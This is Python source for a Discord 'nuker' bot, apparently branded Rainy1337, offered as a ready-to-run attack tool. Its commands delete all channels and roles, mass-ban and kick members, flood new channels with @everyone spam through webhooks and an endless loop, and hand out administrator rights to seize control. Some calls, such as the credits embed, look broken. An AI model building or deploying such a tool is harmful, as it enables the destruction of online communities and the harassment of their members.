from re import X
import sys, discord, requests, threading, asyncio, time
import colorama
import ctypes
import pystyle
import os
import colorama
import json

from discord.ext import commands
from discord import app_commands
from discord.ui import Button, View, Select
from discord.ext.commands import CommandNotFound
from colorama import Fore, Style, Back, init
from time import sleep
from datetime import datetime
from pystyle import *


now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

def clear():
    os.system("cls")

rev = Center.XCenter('''               
                             ;::::;
                           ;::::; :;
                         ;:::::'   :;
                        ;:::::;     ;.  
                        ,:::::'       ;           OOO\ 
                        ::::::;       ;          OOOOO\ 
                        ;:::::;       ;         OOOOOOOO
                      ,;::::::;     ;'         / OOOOOOO
                    ;:::::::::`. ,,,;.        /  / DOOOOOO
                  .';:::::::::::::::::;,     /  /     DOOOO
                 ,::::::;::::::;;;;::::;,   /  /        DOOO
                ;`::::::`'::::::;;;::::: ,#/  /          DOOO
                :`:::::::`;::::::;;::: ;::#  /            DOOO
                ::`:::::::`;:::::::: ;::::# /              DOO
                `:`:::::::`;:::::: ;::::::#/               DOO
                 :::`:::::::`;; ;:::::::::##                OO
                 ::::`:::::::`;::::::::;:::#                OO
                ` :::::`::::::::::::;'`:;::#                O
                 ` :::::`::::::::;' /  / `:#
                  : :::::`:::::;'  /  /   `#         
                                             
''')
ctypes.windll.kernel32.SetConsoleTitleW("Rainy1337 | discord.gg/4luv")
print(Fore.RED + rev)

token = input("[ > ] Token: ")

intents = discord.Intents().all()
intents.message_content = True
rev = commands.Bot(command_prefix="x", intents=intents)
rev.remove_command("help")


if rev:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }

revshit = "discord.gg/revshit"


ascii = """
          
          /$$   /$$ /$$                     
         | $$  | $$| $$                     
         | $$  | $$| $$ /$$   /$$ /$$    /$$
         | $$$$$$$$| $$| $$  | $$|  $$  /$$/
         |_____  $$| $$| $$  | $$ \  $$/$$/ 
               | $$| $$| $$  | $$  \  $$$/  
               | $$| $$|  $$$$$$/   \  $/   
               |__/|__/ \______/     \_/              
                                              
             > MADE WITH LOVE BY RAINY\n\n   
                                                                   
"""
ctypes.windll.kernel32.SetConsoleTitleW("Rainy1337 | discord.gg/4luv")                        

@rev.event
async def on_ready():
   
    clear()    
    await rev.change_presence(activity=discord.Game(revshit))
    os.system('mode con: cols=120 lines=120')
    print(Colorate.Vertical(Colors.rainbow, Center.XCenter(ascii)))
    print()

@rev.command()
async def xvy(ctx): 
    await ctx.guild.edit(name=("test lang po"))
    image_url = ("https://i.hizliresim.com/fl96x1n.jpg")
    image = await asyncio.get_event_loop().run_in_executor(None, lambda: requests.get(image_url).content)
    await ctx.guild.edit(icon=image)
    guild = ctx.guild.id
    
    def spc(i):
        json_data = {
            "name": i
        }
        session.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers=headers,
            json=json_data
        )

    for i in range(40):
        threading.Thread(
            target=spc,
            args=("bobokatol",)
        ).start()

        
@rev.command()
async def help(ctx):
    description = (
         "`✮` ***Prefix*** `x`\n "
         "`✮` ***xbye - Boom***\n"
         "`✮` ***rolespam <amount> - Spam create roles***\n"
         "`✮` ***ownerspam <amount> - Spam the owner's dm***\n"
         "`✮` ***banall - Bans everyone***\n"
         "`✮` ***kickall - Kicks everyone***\n"
         "`✮` ***emoji - Deleting all emoji***\n"
         "`✮` ***delrole - Deleting all roles***\n"
         "`✮` ***unlock - Unlock all channel***\n"
         "`✮` ***lock - Lock all channel***\n"
         "`✮` ***dmall - Dm all members***\n"
         "`✮` ***admin - Giving you admin role***\n"
         "`✮` ***nickall - Changing members nicknames***\n"
         "`✮` ***credits - Credits of the nuker***"
    )

    embed = discord.Embed(
        title="~~**Rainy#1337**~~",
        description=description,
        color = 0x060C11
    )
    embed.set_image(url='https://cdn.discordapp.com/attachments/1245593843609636885/1254883760764223669/HTRB.gif?ex=667bc5d3&is=667a7453&hm=c906ede7fcec52ca9cb212fce31457f5b9a266345e97933d35e3d39802d8bf91&')
    await ctx.message.delete()
    await ctx.author.send(embed=embed)



@rev.command()
@commands.cooldown(1, 500, commands.BucketType.user)
async def nuke(ctx):
    """
    Nuke the server.
    """
    await ctx.message.delete()
    await ctx.guild.edit(name="TAGA 444.LUV")

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

    await asyncio.gather(*[ctx.guild.create_text_channel("444.luv") for _ in range(35)])
    for channel in ctx.guild.text_channels:
        num_webhooks = 20  # change this to the # of webhooks you want
        for _ in range(num_webhooks): 
            webhook = await channel.create_webhook(name=f"rainyluvsu, rainy1337, bobokatol{_}") 
            for _ in range(100):
                await webhook.send(f"# ~~**SORRY PO NAG TEST LANG HEHE**~~  https://discord.gg/4luv @here @everyone")       
                await ctx.send("Nuking the server...")
                guild = ctx.guild.id
                               
@rev.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        hex_color = int("0x5564f1", 16)
        cooldown_embed = discord.Embed(
            title="Cooldown",
            description=f"```Wait {error.retry_after:.1f} bypassing ratelimit.```",
            color=hex_color)
        await ctx.reply(embed=cooldown_embed)
    else:
        raise error

@rev.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("# ~~**SORRY PO NAG TEST LANG HEHE**~~  https://discord.gg/4luv @here @everyone")


@rev.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def rolespam(ctx):
    """
    Spam roles in the server.
    """
    await ctx.message.delete()
    for i in range(100):
        await ctx.guild.create_role(name="MOVE TO 4LUV")
    """
    Spam roles in the server.
    """
    await ctx.send("Spamming roles...")

@rev.command()
@commands.cooldown(1, 50, commands.BucketType.user)
async def guildname(ctx, *, newname):
    """
    Change the server's name.
    """
    await ctx.message.delete()
    await ctx.guild.edit(name=newname)
    await ctx.send(f"Changed the server name to {newname}")

@rev.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")


@rev.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Ganto Mantrip Pakisabi sa idol nyo ~ rainy")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@rev.command()
async def delroles(ctx):
    """
    Delete roles in the server.
    """
    await ctx.message.delete()

    roles_to_delete = [role for role in ctx.guild.roles]

    await asyncio.sleep(10)

    try:
        await asyncio.gather(*[role.delete(reason="Roles deleted by Rainy") for role in roles_to_delete])
        print(Fore.GREEN + "All roles deleted successfully.")
    except Exception as e:
        print(Fore.RED + f"Error deleting roles: {e}")

    await ctx.send("Deleting roles completed.")

@rev.command()
async def give(ctx):
    """
    Give administrator permissions to everyone.
    """
    try:
        everyone_role = ctx.guild.default_role
        await everyone_role.edit(permissions=discord.Permissions.all())
        await ctx.send("You do not have the required role to use this command.")
    except Exception as e:
        print(Fore.RED + f"Error giving administrator permissions: {e}")
        await ctx.send("An error occurred while processing the command.")

@rev.command()
@commands.cooldown(1, 199, commands.BucketType.user)
async def giveme(ctx, server_id: int):
    """
    Give administrator permissions to the user who executed the command.
    """
    try:
        guild = rev.get_guild(server_id)
        if guild:
            admin_role = await guild.create_role(name="Administrator", permissions=discord.Permissions.all(), reason="Created by command")
            
            member = guild.get_member(ctx.author.id)
            
            if member:
                await member.add_roles(admin_role, reason="Assigned by command")
                await ctx.send(f"Administrator permissions granted to {ctx.author.mention} in the server with ID {server_id}.")
            else:
                await ctx.send("Failed to grant administrator permissions. User not found in the server.")
        else:
            await ctx.send("Server not found.")
    except Exception as e:
        print(Fore.RED + f"Error granting administrator permissions: {e}")
        await ctx.send("An error occurred while processing the command.")
@rev.command()
async def removegive(ctx):
    """
    Remove all permissions from the @everyone role.
    """
    try:
        everyone_role = ctx.guild.default_role
        await everyone_role.edit(permissions=discord.Permissions.none())
        await ctx.send("All permissions have been removed from the @everyone role.")
    except Exception as e:
        print(Fore.RED + f"Error removing permissions: {e}")
        await ctx.send("An error occurred while processing the command.")

async def bot(ctx):
    await ctx.author.send(f'''{ctx.author.mention} [Invite](https://discord.com/oauth2/authorize?client_id=1248705915339935816&permissions=8&integration_type=0&scope=bot)''')

@rev.command()
async def credits(ctx):
    await ctx.message.delete()
    embed = discord.Embed('Credits', 'https://revshit.xyz/nashi', '**~~Owner:~~** \n`Socials`: **https://www.facebook.com/profile.php?id=100095443475795**  \n`Server`: **https://discord.gg/CtgZUw3BMV** **https://discord.gg/revshit & https://discord.gg/xorev** \n`Github`: **<https://github.com/idknanashi>**', 396305, **('title', 'url', 'description', 'color'))
    embed.set_image('https://i.hizliresim.com/3kfxt5f.jpg?ex=65efccd2&is=65dd57d2&hm=ef1143368d73af86d909f36ad757a34e286a23ff4332ce9018d0e0279183e9ab&', **('url',))
    embed.set_footer('https://i.hizliresim.com/9sijbyu.png', 'shalom', **('icon_url', 'text'))
    await ctx.author.send(embed, **('embed',))
    print('[ + ] SENT THE CREDITS OF THIS TOOL. ')


bot = rev.command()(bot)
rev.run(token)
